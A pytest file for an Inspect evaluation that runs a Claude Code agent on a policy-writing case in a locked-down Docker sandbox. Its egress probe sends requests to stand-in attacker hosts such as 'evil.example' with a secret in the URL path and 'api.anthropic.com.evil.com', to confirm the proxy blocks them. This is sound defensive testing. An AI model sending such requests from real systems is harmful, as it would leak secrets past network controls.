"""The Inspect task scores our answers on the real case as the dataset tests do.

`--model none`; the Claude Code agent runs on a fake sandbox and a recorded transcript.
"""

from __future__ import annotations

import asyncio
import json
import os
import shutil
import subprocess
import time
from pathlib import Path
from types import SimpleNamespace

import pytest
import yaml

pytest.importorskip("inspect_ai")

from inspect_ai import eval as inspect_eval  # noqa: E402
from inspect_ai.model import ModelName  # noqa: E402
from inspect_ai.scorer import CORRECT, INCORRECT, Target  # noqa: E402
from inspect_ai.solver import TaskState  # noqa: E402
from inspect_ai.util import ExecResult, OutputLimitExceededError  # noqa: E402
from inspect_ai.util._sandbox.local import LocalSandboxEnvironment  # noqa: E402

from evals.policy_writing import checks, task  # noqa: E402
from evals.policy_writing.cases import apply_solution, starting_files  # noqa: E402
from evals.policy_writing.checks import Check, snapshot  # noqa: E402

CASE = "explicit_request/support_refund_cap"
ANSWERS = ("solution", "wrong_answer", "preserve.yaml")
METRICS = {"accuracy", "stderr", "explicit_request", "held_out_False"}


def run(agent: str, log_dir: Path):
    """Run the task on the real case; its one sample's score."""
    (log,) = inspect_eval(
        task.policy_writing(agent=agent, cases=CASE),
        model="none",
        log_dir=str(log_dir),
        display="none",
    )
    assert log.status == "success", log.error
    (scored,) = log.results.scores
    assert set(scored.metrics) == METRICS
    (sample,) = log.samples
    return sample.scores["policy_checks"]


def test_reference_passes(tmp_path: Path) -> None:
    assert run("reference", tmp_path).value == CORRECT


def test_wrong_answer_fails(tmp_path: Path) -> None:
    score = run("wrong_answers", tmp_path)
    assert score.value == INCORRECT
    names = [c["name"] for c in score.metadata["checks"] if not c["passed"]]
    assert any(n.startswith("decision 1:") for n in names), names
    assert "only known arguments and attributes" in names


def test_noop_fails(tmp_path: Path) -> None:
    score = run("noop", tmp_path)
    assert score.value == INCORRECT
    assert "## Answer\n(none)\n" in score.explanation


@pytest.fixture
def token(monkeypatch) -> None:
    monkeypatch.setenv(task.TOKEN_VAR, "sk-ant-oat01-test")


def test_claude_task_happy_path(token) -> None:
    t = task.policy_writing(agent="claude", cases=CASE)
    assert (t.sandbox.type, t.sandbox.config) == ("docker", str(task.COMPOSE))
    assert t.fail_on_error is False  # infra errors are retried, not scored
    assert t.time_limit == 900 + task.SAMPLE_MARGIN  # the agent's timeout fires first


def test_when_claude_and_not_docker_then_task_build_raises(token) -> None:
    with pytest.raises(ValueError, match="only in the docker sandbox"):
        task.policy_writing(agent="claude", sandbox="local")


def test_when_no_token_then_task_build_names_setup_token(monkeypatch) -> None:
    monkeypatch.delenv(task.TOKEN_VAR, raising=False)
    with pytest.raises(RuntimeError, match="claude setup-token"):
        task.policy_writing(agent="claude")


@pytest.mark.parametrize("cases", ["a/", ["a/"], "zzz,a/", ["zzz", " a/ "]])
def test_cases_prefix_selects_the_matching_cases(cases, monkeypatch) -> None:
    # Synthetic ids, so the test still holds as categories gain cases.
    ids = ["a/one", "a/two", "b/one"]
    monkeypatch.setattr(task, "CASES", {i: {**task.CASES[CASE], "id": i} for i in ids})
    dataset = task.policy_writing(agent="reference", cases=cases).dataset
    assert [s.id for s in dataset] == ["a/one", "a/two"]


def test_only_wrong_answers_skips_a_case_without_it(tmp_path, monkeypatch) -> None:
    # Doing nothing is a valid solution, so `solution/` may be absent too.
    bare = {**task.CASES[CASE], "id": "x/bare", "dir": tmp_path}
    monkeypatch.setitem(task.CASES, "x/bare", bare)
    assert [s.id for s in task.samples("solution", ["x/"])] == ["x/bare"]
    assert [s.id for s in task.samples(None, ["x/"])] == ["x/bare"]
    assert task.samples("wrong_answer", ["x/"]) == []


def test_sample_holds_the_starting_project_and_nothing_of_ours() -> None:
    (sample,) = task.policy_writing(agent="reference", cases=CASE).dataset
    assert {"policy.yaml", "agents.json", "audit.json"} <= set(sample.files)
    assert not [f for f in sample.files if any(a in f for a in ANSWERS)]
    assert sample.input == "/write-policy Let support refund orders, up to 50 USD."
    assert json.loads(json.dumps(sample.metadata)) == {
        "case_id": CASE,
        "category": "explicit_request",
        "held_out": False,
    }


# The Claude Code agent, through a fake sandbox.


class FakeSandbox:  # records what the solver asks; `exec` answers from `replies`
    def __init__(self, replies: dict[str, ExecResult | Exception] | None = None):
        self.replies = replies or {}
        self.execs: list[tuple[list[str], dict]] = []
        self.written: dict[str, bytes] = {}
        self.files: dict[str, bytes | Exception] = {}

    async def exec(self, cmd: list[str], **kwargs) -> ExecResult:
        self.execs.append((cmd, kwargs))
        reply = self.replies.get(cmd[0], ok(""))
        if isinstance(reply, Exception):
            raise reply
        return reply

    async def write_file(self, file: str, contents: bytes) -> None:
        self.written[file] = contents

    async def read_file(self, file: str, text: bool = True) -> bytes:
        data = self.files.get(file, FileNotFoundError(file))  # as Inspect raises
        if isinstance(data, Exception):
            raise data
        return data


def ok(stdout: str, stderr: str = "") -> ExecResult:
    return ExecResult(True, 0, stdout, stderr)


# A `claude -p … --output-format stream-json --verbose` run, cut to the fields
# the parser reads (recorded 2026-10-12 with Claude Code 2.1.296).
RESULT = {
    "type": "result",
    "subtype": "success",
    "is_error": False,
    "result": "Capped at 50 USD.",
    "usage": {"input_tokens": 34, "output_tokens": 86},
    "total_cost_usd": 0.29,
    "modelUsage": {"claude-fable-5-1": {"costUSD": 0.29}},
    "duration_ms": 4408,
    "num_turns": 2,
    "session_id": "sid",
}
REFUSED = {
    **RESULT,
    "is_error": True,
    "api_error_status": 401,
    "terminal_reason": "api_error",
}
READ = {
    "type": "tool_use",
    "id": "t1",
    "name": "Read",
    "input": {"file_path": "p.yaml"},
}
READ_RESULT = {"tool_use_id": "t1", "type": "tool_result", "content": "version: 1"}


def message(kind: str, *blocks: dict) -> dict:
    return {"type": kind, "message": {"content": list(blocks)}}


def stream(events: list[dict]) -> str:
    return "\n".join(json.dumps(e) for e in events)


SKILL = "Base directory for this skill: /workspace/.claude/skills/write-policy"
# Claude Code's session log: the command, then what it injected for it (`isMeta`).
COMMAND = {"type": "user", "message": {"content": "<command-name>/write-policy"}}
SESSION_LOG = stream(
    [COMMAND, {**message("user", {"type": "text", "text": SKILL}), "isMeta": True}]
)
TRANSCRIPT = [
    {"type": "system", "subtype": "init", "cwd": "/workspace"},
    message("assistant", {"type": "text", "text": "Reading the policy."}, READ),
    {"type": "rate_limit_event", "rate_limit_info": {}},
    message("user", READ_RESULT),
    message("assistant", {"type": "text", "text": "Capped at 50 USD."}),
    RESULT,
]


def test_parse_stream_happy_path() -> None:
    result, messages = task.parse_stream(stream(TRANSCRIPT))
    assert result == RESULT
    assert [m.role for m in messages] == ["assistant", "tool", "assistant"]
    (call,) = messages[0].tool_calls
    assert (call.id, call.function, call.arguments) == ("t1", "Read", READ["input"])
    assert (messages[1].tool_call_id, messages[1].text) == ("t1", "version: 1")
    assert messages[2].text == "Capped at 50 USD."


async def test_injected_happy_path() -> None:
    sb = FakeSandbox()
    sb.files = {task.SESSION_LOG.format("sid"): SESSION_LOG}
    (turn,) = await task.injected(sb, RESULT)
    assert (turn.role, turn.text) == ("user", SKILL)  # the command itself is not meta
    assert await task.injected(sb, None) == [] and await task.injected(sb, {}) == []


def test_when_the_session_log_is_missing_then_a_warning(caplog) -> None:
    assert asyncio.run(task.injected(FakeSandbox(), RESULT)) == []
    assert "no Claude Code session log" in caplog.text


def test_session_log_follows_the_image_user_and_working_dir() -> None:
    dockerfile = task.COMPOSE.with_name("Dockerfile").read_text().splitlines()
    user = [ln.split()[1] for ln in dockerfile if ln.startswith("USER ")][-1]
    service = yaml.safe_load(task.COMPOSE.read_text())["services"]["default"]
    slug = service["working_dir"].replace("/", "-")
    assert task.SESSION_LOG == f"/home/{user}/.claude/projects/{slug}/{{}}.jsonl"


def test_when_the_run_failed_then_output_error() -> None:
    bad = {**RESULT, "is_error": True, "result": "rate limited"}
    assert task.model_output("none", bad, "unused").error == "rate limited"
    assert task.model_output("none", None, "no result: x").error == "no result: x"


@pytest.mark.parametrize(
    "result, stdout, failure, infra",
    [
        (REFUSED, "{}", "", True),  # as recorded with a revoked token
        ({**REFUSED, "api_error_status": None}, "{}", "", True),
        (None, "", f"{task.NO_RESULT}: exec format error", True),  # never started
        (None, "", "Command timed out after 7 seconds", False),  # the agent's time
        (None, '{"type": "system"}', f"{task.NO_RESULT}: killed", False),  # died
        ({**RESULT, "is_error": True, "subtype": "error_max_turns"}, "{}", "", False),
        (RESULT, "{}", "", False),
    ],
)
def test_infra_error_tells_infrastructure_from_the_agent(
    result, stdout, failure, infra
) -> None:
    assert bool(task.infra_error(stdout, result, failure)) is infra


async def test_when_the_api_refuses_then_the_sample_errors(monkeypatch) -> None:
    replies = {"claude": ok(stream([REFUSED])), "sh": ok("IS_SANDBOX")}
    monkeypatch.setattr(task, "sandbox", lambda: FakeSandbox(replies))
    state = TaskState(ModelName("none/none"), CASE, 0, "/write-policy x", [])
    with pytest.raises(RuntimeError, match="Claude API error 401"):
        await task.claude_agent(7)(state, None)


async def test_run_claude_happy_path() -> None:
    sb = FakeSandbox({"claude": ok("{}", "warn")})
    stdout, failure = await task.run_claude(sb, "/write-policy x", 7)
    assert (stdout, failure) == ("{}", "no result event: warn")
    ((cmd, kwargs),) = sb.execs
    assert cmd[:3] == ["claude", "-p", "/write-policy x"]
    flags = dict(zip(cmd, cmd[1:]))
    assert flags["--permission-mode"] == "bypassPermissions"
    assert flags["--disallowedTools"] == "WebFetch,WebSearch"
    assert not {"--bare", "--append-system-prompt", "--system-prompt"} & set(cmd)
    assert kwargs == {"timeout": 7, "timeout_retry": False}  # nothing of the host's env
    assert "--model" not in cmd  # the subscription's default


async def test_when_a_model_is_given_then_claude_runs_on_it() -> None:
    sb = FakeSandbox({"claude": ok("{}")})
    await task.run_claude(sb, "x", 7, "claude-sonnet-5-5")
    ((cmd, _),) = sb.execs
    assert cmd[-2:] == ["--model", "claude-sonnet-5-5"]


def test_when_a_model_is_given_to_our_answers_then_task_build_raises() -> None:
    with pytest.raises(ValueError, match="model is for agent=claude"):
        task.policy_writing(agent="reference", model="claude-sonnet-5-5")


async def test_when_claude_times_out_then_the_partial_output_is_kept() -> None:
    timed_out = TimeoutError("Command timed out after 7s")
    too_big = OutputLimitExceededError("10 MiB", None)
    # None: Inspect's sandbox proxy, when nothing came out.
    for exc, out in [(timed_out, "{}\nwarn\n"), (timed_out, None), (too_big, None)]:
        exc.truncated_output = out
        sb = FakeSandbox({"claude": exc})
        assert await task.run_claude(sb, "x", 7) == (out or "", str(exc))


def test_when_the_output_is_cut_or_compacted_then_parse_keeps_the_rest() -> None:
    compacted = {"type": "user", "message": {"content": "Summary of the session"}}
    cut = (
        stream(TRANSCRIPT[:-1] + [compacted]) + "\n" + stream([RESULT])[:20] + "stderr"
    )
    result, messages = task.parse_stream(cut)
    assert result is None and len(messages) == 3


async def test_when_the_sandbox_env_is_wrong_then_the_solver_refuses() -> None:
    with pytest.raises(RuntimeError, match="ANTHROPIC_API_KEY set in"):
        await task.check_sandbox_env(
            FakeSandbox({"sh": ok("IS_SANDBOX\nANTHROPIC_API_KEY")})
        )
    with pytest.raises(RuntimeError, match="not the compose.yaml sandbox"):
        await task.check_sandbox_env(
            FakeSandbox({"sh": ok("HOME\nCLAUDE_CODE_OAUTH_TOKEN")})
        )
    sb = FakeSandbox({"sh": ok("IS_SANDBOX\n")})
    await task.check_sandbox_env(sb)
    assert sb.execs[0][0] == ["sh", "-c", "env | cut -d= -f1"]  # names only: logged


def test_compose_passes_only_the_token_and_the_image_holds_none() -> None:
    service = yaml.safe_load(task.COMPOSE.read_text())["services"]["default"]
    assert service["working_dir"] == "/workspace"
    assert service["environment"] == [
        "CLAUDE_CODE_OAUTH_TOKEN",
        "IS_SANDBOX=1",
        "HTTPS_PROXY=http://proxy:3128",
        "HTTP_PROXY=http://proxy:3128",
        "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1",
        "CLAUDE_CODE_SUBPROCESS_ENV_SCRUB=1",
        "NO_PROXY=localhost,127.0.0.1",
    ]
    dockerfile = task.COMPOSE.with_name("Dockerfile").read_text()
    assert "ANTHROPIC" not in dockerfile and "sk-ant" not in dockerfile
    assert "OAUTH_TOKEN=" not in dockerfile and "claude-code@2." in dockerfile
    users = [ln.split()[1] for ln in dockerfile.splitlines() if ln.startswith("USER ")]
    assert users[-1] not in ("root", "0")  # bypassPermissions is refused as root


def test_sandbox_reaches_only_anthropic_through_the_proxy() -> None:
    compose = yaml.safe_load(task.COMPOSE.read_text())
    assert compose["services"].keys() == {"default", "proxy"}  # no other way out
    agent, proxy = compose["services"]["default"], compose["services"]["proxy"]
    assert agent["networks"] == ["sandbox"] and compose["networks"]["sandbox"] == {
        "internal": True
    }
    assert set(proxy["networks"]) == {"sandbox", "egress"}
    assert not compose["networks"]["egress"]  # not internal: the proxy's way out
    assert agent.keys() <= {
        *("build", "image", "command", "init", "stop_grace_period", "working_dir"),
        *("environment", "networks", "depends_on"),
    }
    assert agent["depends_on"] == {"proxy": {"condition": "service_healthy"}}
    assert "ports" not in proxy and proxy["healthcheck"]["retries"] == 10
    for service in compose["services"].values():
        assert not {"dns", "extra_hosts", "network_mode", "cap_add", "privileged"} & (
            service.keys()
        )
    assert proxy["image"].endswith(
        "@sha256:8a3baed477e2c282ab8aa5edad442f69873246964f225c5c2ae8364b6610963c"
    )
    conf = task.COMPOSE.with_name("squid.conf").read_text().splitlines()
    assert proxy["volumes"] == ["./squid.conf:/etc/squid/squid.conf:ro"]
    lines = [ln.strip() for ln in conf]
    assert [ln for ln in lines if ln and not ln.startswith("#")] == [
        "http_port 3128",
        "acl anthropic dstdomain -n api.anthropic.com",  # -n: no reverse DNS on an IP
        "acl tls port 443",
        "acl CONNECT method CONNECT",
        "http_access allow CONNECT anthropic tls",
        "http_access deny all",
        "cache deny all",
        "logformat egress %ts.%03tu %Ss/%03>Hs %Sh %rm %>rd:%>rP",  # no URL path
        "access_log stdio:/var/log/squid/access.log egress",  # tailed to stdout
    ]


PROBE = """
import json, socket
def ask(req):
    try:
        s = socket.create_connection(("proxy", 3128), timeout=8)
        s.sendall(req.encode())
        line = s.recv(400).decode(errors="replace").split("\\r\\n")[0]
        s.close()
        return line
    except OSError as e:
        return f"ERR {e}"
def connect(target):
    return ask(f"CONNECT {target} HTTP/1.1\\r\\nHost: {target}\\r\\n\\r\\n")
def direct(host, port):
    try:
        socket.create_connection((host, port), timeout=4).close()
        return "OPEN"
    except OSError as e:
        return f"ERR {e}"
def dns(host):
    try:
        return socket.gethostbyname(host)
    except OSError as e:
        return f"ERR {e}"
get = "GET http://{0}/{1} HTTP/1.1\\r\\nHost: {0}\\r\\n\\r\\n"
print(json.dumps({
    "api:443": connect("api.anthropic.com:443"),
    "example:443": connect("example.com:443"),
    "api:80": connect("api.anthropic.com:80"),
    "suffix:443": connect("api.anthropic.com.evil.com:443"),
    "ip:443": connect("160.79.104.10:443"),
    "get api": ask(get.format("api.anthropic.com", "")),
    "mgr": ask(get.format("proxy:3128", "squid-internal-mgr/info")),
    "secret": ask(get.format("evil.example", "s3cr3t-in-path")),
    "dns": dns("api.anthropic.com"),
    "tcp": direct("160.79.104.10", 443),
}))
"""


@pytest.mark.integration
def test_the_running_sandbox_reaches_only_anthropic_through_the_proxy() -> None:
    """Brings compose.yaml up (no token, no build) and probes from `default`."""
    docker = shutil.which("docker")
    if not docker or subprocess.run([docker, "info"], capture_output=True).returncode:
        pytest.skip("docker is not running")
    image = [docker, "image", "inspect", "hexgate-policy-eval"]
    if subprocess.run(image, capture_output=True).returncode:
        pytest.skip("no hexgate-policy-eval image: `make policy-eval` builds it")
    compose = [docker, "compose", "-f", str(task.COMPOSE)]
    compose += ["-p", f"hexgate-egress-test-{os.getpid()}"]
    env = {k: v for k, v in os.environ.items() if k != "CLAUDE_CODE_OAUTH_TOKEN"}
    try:
        up = [*compose, "up", "-d", "--no-build", "--wait", "--wait-timeout", "60"]
        subprocess.run(up, env=env, check=True, capture_output=True)
        out = subprocess.run(
            [*compose, "exec", "-T", "default", "python3", "-c", PROBE],
            env=env,
            check=True,
            capture_output=True,
            text=True,
        ).stdout
        for _ in range(20):  # squid writes a line when the connection closes
            logs = subprocess.run(
                [*compose, "logs", "proxy"], env=env, capture_output=True, text=True
            ).stdout
            if "evil.example" in logs:
                break
            time.sleep(0.5)
    finally:
        down = [*compose, "down", "-v", "--timeout", "1"]
        subprocess.run(down, env=env, capture_output=True)
    got = json.loads(out)
    assert got.pop("api:443").startswith("HTTP/1.1 200")
    assert got.pop("dns").startswith("ERR") and got.pop("tcp").startswith("ERR")
    assert all(" 403 " in line for line in got.values()), got
    assert "evil.example:80" in logs and "s3cr3t" not in logs


def test_sandbox_image_installs_opa_per_architecture_before_dropping_root() -> None:
    dockerfile = task.COMPOSE.with_name("Dockerfile").read_text()
    for arch, sha in [
        ("amd64", "00d114b94fdb1606a48cccdfc73c9ccdc62c38721150131ae578d5ff3df5c084"),
        ("arm64", "48061407a2d7b0b59440fc3a257e7bb251e9ec62f6ce7b1e45c142263ae24413"),
    ]:
        url = f"https://openpolicyagent.org/downloads/v0.70.0/opa_linux_{arch}_static"
        assert f"--checksum=sha256:{sha} \\\n    {url} /opa" in dockerfile
    assert "FROM opa-${TARGETARCH}" in dockerfile
    assert dockerfile.index("/usr/local/bin/opa") < dockerfile.index("\nUSER ")


async def test_when_a_read_fails_then_pull_reports_agent_ran(tmp_path: Path) -> None:
    sb = FakeSandbox({"find": ok("10 ./policy.yaml\n 0 ./gone.yaml\n10 total\n")})
    sb.files = {"policy.yaml": b"version: 1", "gone.yaml": FileNotFoundError("gone")}
    _, check = await task.pull(sb, tmp_path)
    assert check == Check("agent ran", False, "reading the sandbox failed: gone")
    assert (tmp_path / "policy.yaml").read_bytes() == b"version: 1"


async def test_claude_agent_and_scorer_happy_path(ws: Path, monkeypatch) -> None:
    files = checks.snapshot(ws)
    listing = ok("".join(f"{(ws / f).stat().st_size} ./{f}\n" for f in files))
    replies = {
        "claude": ok(stream(TRANSCRIPT)),
        "find": listing,
        "sh": ok("IS_SANDBOX"),
    }
    sb = FakeSandbox(replies)
    sb.files = {f: (ws / f).read_bytes() for f in files}
    sb.files[task.SESSION_LOG.format("sid")] = SESSION_LOG
    monkeypatch.setattr(task, "sandbox", lambda: sb)
    monkeypatch.setattr(task, "sample_limits", SimpleNamespace)
    state = TaskState(ModelName("none/none"), CASE, 0, "/write-policy x", [])
    state = await task.claude_agent(7, "claude-sonnet-5-5")(state, None)
    assert {".claude/skills/write-policy/SKILL.md"} == set(sb.written)
    assert sb.execs[-1][0][-2:] == ["--model", "claude-sonnet-5-5"]
    assert state.output.completion == "Capped at 50 USD."
    assert [m.role for m in state.messages] == [
        "user",
        "assistant",
        "tool",
        "assistant",
    ]
    score = await task.policy_checks("claude-sonnet-5-5")(state, Target(""))
    assert score.value == CORRECT
    assert score.metadata["usage"] == {k: RESULT[k] for k in task.USAGE_KEYS}
    assert score.metadata["model"] == "claude-sonnet-5-5"


# `grade` is the step after the pull: a workspace on the host, as the sandbox left it.


def write(root: Path, files: dict[str, str]) -> None:
    for rel, text in files.items():
        (root / rel).parent.mkdir(parents=True, exist_ok=True)
        (root / rel).write_bytes(text.encode("utf-8"))


def test_hashes_match_snapshot(tmp_path: Path) -> None:
    # `grade` hashes `before` in memory; it must agree with `snapshot` of the same files.
    files = {"policy.yaml": "v: 1\n", "policies/org.yaml": "# café → 50 €\n"}
    write(tmp_path, files)
    assert task.hashes(files) == snapshot(tmp_path)


@pytest.fixture
def ws(tmp_path: Path) -> Path:
    """The starting project with our solution on top, as the reference agent leaves it."""
    write(tmp_path, starting_files(task.CASES[CASE]))
    apply_solution(task.CASES[CASE], tmp_path)
    return tmp_path


def grade(ws: Path, answer: str = "", ran=None, size: tuple[int, int] = (3, 3)):
    return task.grade(task.CASES[CASE], ws, answer, size, ran)


def names(score) -> list[str]:
    return [c["name"] for c in score.metadata["checks"]]


def test_grade_happy_path(ws: Path) -> None:
    score = grade(ws, "Capped at 50 USD.")
    assert score.value == CORRECT
    assert "## Changes\n### policy.yaml\n```diff" in score.explanation


def test_when_agent_did_not_run_then_that_check_comes_first(ws: Path) -> None:
    score = grade(ws, ran=Check("agent ran", False, "time limit reached"))
    assert score.value == INCORRECT
    assert score.metadata["checks"][0] == {
        "name": "agent ran",
        "passed": False,
        "detail": "time limit reached",
    }


@pytest.mark.parametrize("size", [(task.MAX_FILES + 1, 10), (5, task.MAX_BYTES + 1)])
def test_when_past_a_bound_then_only_the_size_check(ws: Path, size) -> None:
    score = grade(ws, size=size)
    assert score.value == INCORRECT
    assert names(score) == ["workspace size"]
    assert f"{size[0]} files, {size[1]} bytes" in score.metadata["checks"][0]["detail"]
    assert "(not diffed: workspace past the bounds)" in score.explanation


def test_when_at_the_bounds_then_scored(ws: Path) -> None:
    score = grade(ws, size=(task.MAX_FILES, task.MAX_BYTES))
    assert "workspace size" not in names(score)


def test_diff_is_cut_at_max_lines(ws: Path) -> None:
    (ws / "policy.yaml").write_text("\n".join(f"line {i}" for i in range(250)))
    diff = grade(ws).explanation.split("```diff\n")[1]
    body = diff.split("\n```")[0].splitlines()
    assert len(body) == task.MAX_DIFF_LINES + 1
    assert body[-1].startswith("… ") and body[-1].endswith(" more lines")


def test_answer_is_cut_in_the_explanation_only(ws: Path) -> None:
    answer = "a" * 5_000
    score = grade(ws, answer)
    assert score.answer == answer
    assert "a" * 4_000 + "…" in score.explanation
    assert "a" * 4_001 not in score.explanation


# The sandbox side, on Inspect's own local sandbox (a temp folder).


def tree(root: Path) -> dict[str, bytes]:
    return {
        p.relative_to(root).as_posix(): p.read_bytes()
        for p in root.rglob("*")
        if p.is_file()
    }


def test_push_answer_writes_what_apply_solution_does(tmp_path: Path) -> None:
    case = {"dir": tmp_path / "case"}
    write(
        case["dir"] / "solution",
        {"a.yaml": "1", "b c/d.yaml": "é", "ANSWER.md": "Done."},
    )
    sb, host = LocalSandboxEnvironment(), tmp_path / "host"
    answer = asyncio.run(task.push_answer(sb, case, "solution"))
    assert answer == apply_solution(case, host, "solution") == "Done."
    assert tree(Path(sb.directory.name)) == tree(host)


def test_pull_workspace_copies_within_bounds(tmp_path, monkeypatch) -> None:
    sb = LocalSandboxEnvironment()
    write(Path(sb.directory.name), {"a": "abc", "b c/d": "hello", ".claude/x": "no"})
    dest, over = tmp_path / "dest", tmp_path / "over"
    assert asyncio.run(task.pull_workspace(sb, dest)) == (2, 8)
    assert set(tree(dest)) == {"a", "b c/d"}
    monkeypatch.setattr(task, "MAX_FILES", 1)
    assert asyncio.run(task.pull_workspace(sb, over)) == (2, 8)
    assert not over.exists()
